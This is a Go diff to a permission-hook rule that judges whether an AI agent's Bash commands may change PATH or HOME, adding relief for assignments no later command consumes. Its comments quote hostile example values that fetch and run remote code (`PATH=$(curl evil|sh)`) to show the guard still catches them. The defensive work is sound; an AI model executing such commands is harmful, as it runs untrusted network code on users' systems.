@@ -696,6 +696,284 @@ func isHermeticHomeReplacement(ev cmdparse.EnvAssignment, tempDirVars map[string
 	return expanded
 }
 
+// ==================== pg2-7sqk8: CONSUMPTION-SCOPED RELIEF ====================
+//
+// Operator observation (2026-08-28): preservesCallerValue/isHermeticEnvReplacement/
+// isHermeticHomeReplacement all try to classify the ASSIGNED VALUE as safe or
+// unsafe. That is the wrong axis — the actual harm from a PATH/HOME change is never
+// in the value itself, it is in what a LATER command does with it (which binary a
+// bare name resolves to, which dotfile/credential path gets read). This section adds
+// a DIFFERENT, ADDITIONAL relief that sidesteps the value question entirely by
+// asking whether anything OBSERVABLE actually consumes the change, for the two
+// shapes bash itself scopes a PATH/HOME assignment to:
+//
+//  1. commandDoesNotDelegate (mechanism 1): a LEADING/SCOPED assignment
+//     (`PATH=/x cmd`, not wholeLeaf) is scoped by bash to `cmd` ALONE — nothing
+//     else in the script or a later Bash tool call ever sees it. So the question
+//     collapses to "does `cmd` itself perform a further bare-name lookup or exec
+//     that a hostile PATH could redirect" — if it does not, the redefinition is
+//     inert BY CONSTRUCTION, independent of the value.
+//  2. downstreamConsumerExists (mechanism 2): a PERSISTENT assignment (wholeLeaf —
+//     `export`/`env`/`command` or a bare command-less leaf) persists to the rest of
+//     the SAME expression, and — per the Claude Code Bash tool's own documented
+//     contract, shell state does NOT persist between tool calls (only cwd does) —
+//     no further than that. So the question becomes "does anything AFTER this
+//     assignment, in the SAME expression, perform a bare-name resolution or read a
+//     HOME-relative path" — if nothing does, there is no consumer this harness can
+//     ever reach, and it is sound to relax regardless of the value.
+//
+// CAVEAT (carried from the bead into the code, not merely the tracker): mechanism 2's
+// "does not persist past this call" premise is a fact about THIS harness's Bash tool
+// contract specifically, not a general bash truth. If this engine is ever invoked for
+// a context with a genuinely persistent shell (a different harness/tool integration),
+// downstreamConsumerExists' relief MUST NOT be assumed to apply there without
+// re-deriving the persistence boundary for that context.
+//
+// SCOPE: neither mechanism touches injectorVars/injectorAskVars (a different,
+// name-based injection-vector family — see those maps' own docs), and neither
+// changes the three existing value-based reliefs above — both are ADDITIONAL and
+// are consulted only as a FALLBACK, after those three have all failed to clear the
+// value (see evaluateAssignment's askVars case). Both are also value-BLIND by
+// construction: they never set Decision to hookio.Approve (only the three verified
+// -safe-VALUE predicates above may do that), so a value that separately carries an
+// unclassifiable substitution (`PATH=$(curl evil|sh)`) still reaches
+// evaluateAssignment's ExpansionUnknown safety net afterward exactly as before —
+// that net's `result.Decision != hookio.Approve` guard stays satisfied by a
+// mechanism-1/2 NoOpinion, so it is never skipped by this relief. Neither mechanism
+// relaxes anything where a consumer/delegation IS found — that case keeps today's
+// Ask (or whatever the value-based check already said), unchanged.
+
+// nonDelegatingCommands are executables that, by their own documented behavior,
+// NEVER themselves perform a further bare-name PATH lookup or exec of another
+// program. This is a DIFFERENT, narrower axis than internal/rules/safecmds' own
+// content-safety lists (never mutates / never reads file content) — a command can
+// be perfectly content-safe and still delegate (`awk`'s system()/`print | "cmd"`,
+// `find -exec`, `xargs`, `env`, `command`, any shell or language interpreter) — so
+// this is its own small, explicitly curated set, deliberately not a reuse of those
+// lists: widening THIS set has a different, narrower safety question than widening
+// a content-safety list, and folding them together would let a future addition to
+// one silently strengthen a claim it was never vetted for.
+//
+// Every member here is a "leaf" program: it reads/prints/inspects and returns,
+// invoking nothing else by name. Deliberately NOT included, even when otherwise
+// harmless or already on a safecmds allowlist: awk, find, xargs, env, command,
+// which, type, sudo, nohup, nice, time, watch, make, git (hooks can exec arbitrary
+// scripts), yq/tee/rm/cp/mv/mkdir/touch/chmod (a separate, unrelated write-safety
+// axis this predicate does not adjudicate), any shell or language interpreter, and
+// anything that accepts an arbitrary program name as an operand.
+var nonDelegatingCommands = map[string]bool{
+	"echo": true, "printf": true, "true": true, "false": true,
+	"pwd": true, "basename": true, "dirname": true, "realpath": true, "readlink": true,
+	"date": true, "uname": true, "hostname": true, "id": true, "whoami": true,
+	"cat": true, "head": true, "tail": true, "wc": true, "sort": true, "uniq": true,
+	"mktemp": true, "seq": true, "stat": true, "file": true, "du": true, "ls": true,
+	"printenv": true, "sleep": true, "cut": true, "tr": true,
+	"base64": true, "paste": true, "xxd": true, "strings": true,
+	"less": true, "more": true, "diff": true, "grep": true, "jq": true, "tq": true,
+	"df": true, "ps": true, "tree": true,
+}
+
+// commandDoesNotDelegate reports whether executable — the SAME leaf's own command,
+// beside a leading/scoped PATH/HOME assignment (mechanism 1) — is on
+// nonDelegatingCommands. Basename-matched, the same convention every other
+// executable-name lookup in this tree uses (assignmentIsWholeLeaf above included),
+// so an absolute or relative path to one of these programs still qualifies. Empty
+// (a command-less leaf) is correctly false via filepath.Base(""), but that shape is
+// never reached through this predicate anyway — see evaluateAssignment's mechanism-1
+// case, gated on !wholeLeaf.
+func commandDoesNotDelegate(executable string) bool {
+	return nonDelegatingCommands[filepath.Base(executable)]
+}
+
+// referencesHomeRelativePath reports whether text textually names a HOME-relative
+// path: a leading tilde (`~`, `~/...`), or a `$HOME`/`${HOME}` reference — the
+// "reads a HOME-relative credential/dotfile path" half of mechanism 2's consumer
+// check (leafConsumesPathOrHome).
+//
+// Deliberately TEXTUAL and narrow: it does not attempt to enumerate which programs
+// implicitly read a dotfile without ever naming it in argv (git's ~/.gitconfig,
+// ssh's ~/.ssh, npm's ~/.npmrc, a shell's own rc files, …) — that knowledge exists
+// nowhere else in this tree either. A residual false negative here is no more
+// permissive than leafConsumesPathOrHome's OWN bare-name-exec arm already is: most
+// such tools are themselves invoked by a bare name, which already makes the leaf
+// count as a consumer on that ground alone.
+func referencesHomeRelativePath(text string) bool {
+	if strings.HasPrefix(text, "~") {
+		return true
+	}
+	return strings.Contains(text, "$HOME") || strings.Contains(text, "${HOME}")
+}
+
+// leafConsumesPathOrHome reports whether leaf itself is a PATH-or-HOME consumer:
+// EITHER its own executable is invoked by a BARE NAME (no path separator — the
+// PATH-lookup shape a hijacked PATH could redirect for THIS invocation's own
+// resolution), OR its executable is invoked via a path but is NOT affirmatively
+// known to avoid further bare-name delegation (commandDoesNotDelegate), OR one of
+// its argv/redirection targets textually names a HOME-relative path. Deliberately
+// UNIFIED across PATH and HOME rather than split per-variable-name: treating EITHER
+// hazard as disqualifying is the conservative direction — it can only ever keep
+// asking a case a per-name split would have relieved, never the reverse.
+//
+// THE PATH-INVOKED-BUT-DELEGATING GAP (tc-2phi8-adjacent, found empirically against
+// TestIntegration_KcRules' own "compound cd+export+exe" regression): a leaf invoked
+// via a slash-containing name (`bin/kc exe … -- bats`) is not itself subject to
+// PATH lookup, but that does not make it inert — `bin/kc` almost certainly execs
+// `kubectl` internally by a BARE name, which the hijacked PATH would still redirect.
+// So a slash-containing executable is a consumer too UNLESS it is on
+// nonDelegatingCommands — the identical predicate mechanism 1 uses for the SAME
+// reason, applied here to a leaf this scan cannot see the insides of. This is why
+// commandDoesNotDelegate, not the bare-name test alone, gates the path-invoked half:
+// a BARE name is ALWAYS a consumer regardless of delegation (bare `ls` after
+// `export PATH=/evil` still risks running `/evil/ls`), while a PATH-invoked name's
+// own resolution is unaffected and only its POSSIBLE internal delegation matters.
+//
+// A command-less leaf (another bare assignment) is NOT itself a consumer of an
+// EARLIER leaf's PATH/HOME by this test — whether it shadows/revokes the earlier
+// binding is a separate question this narrow check does not model; a leaf
+// downstream of IT is still walked and judged on its own merits.
+func leafConsumesPathOrHome(leaf cmdparse.ParsedCommand) bool {
+	if exe := leaf.Executable; exe != "" {
+		if !strings.ContainsRune(exe, '/') {
+			return true
+		}
+		if !commandDoesNotDelegate(exe) {
+			return true
+		}
+	}
+	for _, a := range leaf.Args {
+		if referencesHomeRelativePath(a) {
+			return true
+		}
+	}
+	for _, rdir := range leaf.Redirections {
+		if referencesHomeRelativePath(rdir.Path) {
+			return true
+		}
+	}
+	return false
+}
+
+// isMultiStagePipelineLeaf reports whether leaf i is one stage of a MULTI-STAGE
+// pipeline. A lone command is a one-stage pipeline and is not one of these. A
+// downstreamConsumerExists caller treats this as an automatic consumer (see its own
+// doc): a pipeline stage runs in its own subshell exactly like `( … )` does, and
+// this file does not attempt the pipeline analogue of subshellStillOpen's
+// enclosing-scope test — the safe default when the exact isolation cannot be
+// derived is "assume it could still see it", never the reverse.
+//
+// A local reimplementation of the identical check internal/rules/git's own
+// inMultiStagePipelineStage already makes, rather than a shared helper — that
+// file's own doc explains why (exporting one would widen that package's API for a
+// single consumer); this bead's own copy follows the same, already-established
+// convention rather than introducing a new one.
+func isMultiStagePipelineLeaf(leaves []cmdparse.ParsedCommand, i int) bool {
+	pc := leaves[i]
+	if pc.PipelineID < 0 { // a synthesized leaf stands in no pipeline
+		return false
+	}
+	if pc.PipelineIndex > 0 {
+		return true
+	}
+	for j, other := range leaves {
+		if j != i && other.PipelineID == pc.PipelineID && other.PipelineIndex > pc.PipelineIndex {
+			return true
+		}
+	}
+	return false
+}
+
+// subshellStillOpen reports whether writer's subshell (if any) is STILL OPEN at a
+// leaf whose own scope is `at` — writer is a PREFIX of, or equal to, at. The
+// FORWARD-looking twin of cmdparse.InCommandVars' own (unexported) scopeVisible:
+// the identical prefix test, applied to "is the assignment's enclosing subshell
+// still open at a LATER leaf" rather than "was the writer's subshell still open
+// when an EARLIER leaf ran" — the visibility condition is symmetric in the scope
+// path itself; only the leaf-order direction differs. Kept as its own small copy
+// here rather than an export from cmdparse for one caller, matching how this file's
+// siblings (isMultiStagePipelineLeaf above, following git.go's own precedent) each
+// keep their own copy of a pattern like this.
+func subshellStillOpen(writer, at []int) bool {
+	if len(writer) > len(at) {
+		return false
+	}
+	for i, id := range writer {
+		if at[i] != id {
+			return false
+		}
+	}
+	return true
+}
+
+// downstreamConsumerExists (mechanism 2) reports whether ANY leaf after
+// rootLeaves[at] — still within the visible scope a persistent export/assignment at
+// that position would reach — is a PATH-or-HOME consumer (leafConsumesPathOrHome).
+//
+// at out of range is treated as "assume a consumer exists" — the conservative
+// direction for a position this function could not establish; see
+// envvarsRootScope, whose own fallback can hand back an `at` that is valid for
+// `rootLeaves` by construction, so this guard is defensive rather than a real path
+// under the engine.
+func downstreamConsumerExists(rootLeaves []cmdparse.ParsedCommand, at int) bool {
+	if at < 0 || at >= len(rootLeaves) {
+		return true
+	}
+	scope := rootLeaves[at].SubshellScope
+	for j := at + 1; j < len(rootLeaves); j++ {
+		if !subshellStillOpen(scope, rootLeaves[j].SubshellScope) {
+			continue
+		}
+		if isMultiStagePipelineLeaf(rootLeaves, j) {
+			return true
+		}
+		if leafConsumesPathOrHome(rootLeaves[j]) {
+			return true
+		}
+	}
+	return false
+}
+
+// envvarsRootScope recovers the ROOT expression's leaves and this leaf's position
+// within them, for downstreamConsumerExists' walk — the identical RootExpression
+// fallback convention internal/rules/git's expressionScope and
+// internal/rules/gitdir's pipeScope each already apply on their own copy (each
+// consumer keeps its own copy rather than exporting one for a single caller, per
+// isMultiStagePipelineLeaf's own doc above).
+//
+// Under the engine, `leaves` (from cmdparse.LeavesOf) is the ONE leaf the rule was
+// handed and input.RootExpression is the whole compound; cmdparse.RootLeavesOf reads
+// the engine's already-threaded input.ParsedRoot. A DIRECT caller (a unit test) has
+// no RootExpression at all, and `leaves` is already Parse's output for the WHOLE
+// command it was given — exactly the fallback every sibling seam applies, and (for
+// this bead's forward-looking walk) already correct with no further lookup needed.
+//
+// Matching is by Raw text plus pipeline coordinates — the identical three-field test
+// internal/rules/primarycommit's own (unexported) leafIndex applies, more precise
+// than Raw alone. Ties (duplicate leaf text) resolve to the FIRST occurrence, not
+// the last: this function's caller only ever walks FORWARD from the returned
+// position, and understating that position (finding an earlier duplicate than the
+// true one) only makes the walk see MORE of the expression, never less — the
+// conservative direction for a check whose failure mode is a missed consumer, not
+// an over-reported one. (git's own expressionScope takes the LAST occurrence
+// instead, for the opposite reason: its walk looks BACKWARD, so understating the
+// position there would see LESS of what came before — the same conservative
+// direction, achieved by the opposite tie-break.)
+func envvarsRootScope(input *hookio.HookInput, leaves []cmdparse.ParsedCommand, i int) ([]cmdparse.ParsedCommand, int) {
+	if input == nil || input.RootExpression == "" {
+		return leaves, i
+	}
+	if i < 0 || i >= len(leaves) {
+		return leaves, i
+	}
+	root := cmdparse.RootLeavesOf(input)
+	pc := leaves[i]
+	for j, l := range root {
+		if l.Raw == pc.Raw && l.PipelineID == pc.PipelineID && l.PipelineIndex == pc.PipelineIndex {
+			return root, j
+		}
+	}
+	return leaves, i
+}
+
 func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
 	if input.ToolName != "Bash" {
 		return hookio.NotApplicable()
@@ -745,8 +1023,18 @@ func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
 		// seam per the operator ruling). Same base/local fallback reasoning as vars
 		// above.
 		tempDirVars := primarycommit.LeafTempDirVars(input.InCommandTempDirVars, parsed, i)
+		// pg2-7sqk8 mechanism 2: computed ONCE per leaf, not per assignment — it
+		// depends only on the leaf's own position in the root expression, never on
+		// which variable's value is being judged, and only wholeLeaf leaves can ever
+		// consult it (see evaluateAssignment's askVars case), so the lookup is
+		// skipped entirely for a leaf beside a real command.
+		var hasDownstreamConsumer bool
+		if wholeLeaf {
+			rootLeaves, at := envvarsRootScope(input, parsed, i)
+			hasDownstreamConsumer = downstreamConsumerExists(rootLeaves, at)
+		}
 		for _, ev := range pc.EnvVars {
-			sub, subRefused := r.evaluateAssignment(ev, input, vars, tempDirVars, pc.EnvCleared)
+			sub, subRefused := r.evaluateAssignment(ev, input, vars, tempDirVars, pc.EnvCleared, wholeLeaf, hasDownstreamConsumer, pc.Executable)
 			refused = refused || subRefused
 			if sub.Decision == hookio.Approve {
 				if wholeLeaf && held == nil {
@@ -823,7 +1111,18 @@ func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
 // the leaf this assignment belongs to (true iff the leaf's executable runs under
 // `env -i`/`env --ignore-environment`); both are pg2-d71my's REPLACEMENT-form
 // relief inputs, independent of each other and of vars/preservesCallerValue.
-func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookInput, vars, tempDirVars map[string]string, envCleared bool) (result hookio.RuleResult, refused bool) {
+//
+// wholeLeaf/hasDownstreamConsumer/leafExecutable are pg2-7sqk8's consumption-scoped
+// relief inputs (mechanisms 1 and 2 — see that section's own doc above). wholeLeaf
+// is the caller's own assignmentIsWholeLeaf(pc) for the leaf this assignment
+// belongs to; hasDownstreamConsumer is downstreamConsumerExists over that leaf's
+// position in the root expression (computed by the caller ONCE per leaf, never per
+// assignment, and only when wholeLeaf — see Evaluate's own comment); leafExecutable
+// is pc.Executable, consulted by commandDoesNotDelegate only on the !wholeLeaf path.
+// All three reproduce the exact pre-pg2-7sqk8 behaviour when the leaf's own
+// command delegates (or there is a downstream consumer): neither new case matches
+// and the switch falls through to the pre-existing decisive Ask.
+func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookInput, vars, tempDirVars map[string]string, envCleared, wholeLeaf, hasDownstreamConsumer bool, leafExecutable string) (result hookio.RuleResult, refused bool) {
 	name := r.Name()
 
 	// Base verdict from the variable NAME.
@@ -882,6 +1181,46 @@ func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookI
 			result = hookio.RuleResult{
 				Decision: hookio.Approve,
 				Reason:   "HOME replacement is grounded in a fresh mktemp -d temporary directory: " + sanitizeReasonName(ev.Name),
+				Module:   name,
+			}
+		// pg2-7sqk8 mechanism 1 (consumption-scoped, NOT value-based — see this
+		// file's own CONSUMPTION-SCOPED RELIEF section above). A leading/scoped
+		// assignment is bash-scoped to THIS LEAF'S OWN command alone; if that
+		// command never itself performs a further bare-name lookup or exec, the
+		// redefinition is inert regardless of the value, so the value is never
+		// even examined here. Decision is deliberately NoOpinion, not Approve:
+		// unlike the three cases above, this one has not vetted the VALUE at all,
+		// so it must not skip the ExpansionUnknown safety net below — a value that
+		// separately embeds an unclassifiable substitution
+		// (`PATH=$(curl evil|sh) echo hi`) still needs that net to re-escalate,
+		// and a NoOpinion (unlike Approve) leaves its `result.Decision !=
+		// hookio.Approve` guard satisfied. Gated on !wholeLeaf: a wholeLeaf leaf
+		// has no command of its own for this predicate to consult and belongs to
+		// mechanism 2 instead.
+		case !wholeLeaf && commandDoesNotDelegate(leafExecutable):
+			result = hookio.RuleResult{
+				Decision: hookio.NoOpinion,
+				Reason:   "sensitive env var is scoped to this leaf's own command, which does not itself perform a further name-based lookup or exec: " + sanitizeReasonName(ev.Name),
+				Module:   name,
+			}
+		// pg2-7sqk8 mechanism 2 (consumption-scoped, NOT value-based). A wholeLeaf
+		// assignment persists only to the rest of THIS SAME expression (and, per
+		// this harness's Bash tool contract, no further than that); if nothing
+		// downstream performs a bare-name resolution or reads a HOME-relative
+		// path, there is no consumer this harness can ever reach, so it is sound
+		// to relax regardless of the value. Same NoOpinion-not-Approve reasoning
+		// as mechanism 1 above: the ExpansionUnknown safety net below must still
+		// see and re-escalate a genuinely unclassifiable value
+		// (`export PATH="$PATH:$(curl evil)"` keeps asking via that net, even
+		// though this leaf is standalone). Gated on wholeLeaf: condition 3 of the
+		// Rule contract — no command on THIS leaf for a decisive verdict to
+		// pre-empt — is exactly what the three Approve reliefs above already
+		// require, and this relief needs the identical guarantee for the SAME
+		// reason.
+		case wholeLeaf && !hasDownstreamConsumer:
+			result = hookio.RuleResult{
+				Decision: hookio.NoOpinion,
+				Reason:   "sensitive env var change has no consumer in the remainder of this expression: " + sanitizeReasonName(ev.Name),
 				Module:   name,
 			}
 		default:
